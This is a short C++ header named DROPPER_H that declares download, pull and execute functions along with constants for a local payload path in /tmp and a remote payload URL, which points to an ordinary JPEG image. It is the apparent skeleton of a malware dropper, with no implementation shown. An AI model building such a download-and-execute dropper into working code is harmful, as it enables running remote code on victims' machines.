#ifndef DROPPER_H
#define DROPPER_H

#include <string>
#include <cstdio>
#include <vector>
#include <sys/stat.h>
#include <iostream>
#include <unistd.h>

const std::string _IP("127.0.0.1");
const std::string _PayloadLocal("/tmp/image.jpg");
const std::string _PayloadRemote("https://www.cleverfiles.com/howto/wp-content/uploads/2016/08/mini.jpg");

bool fileExists(std::string);
void execute();
int  pull();
void download();

#endif


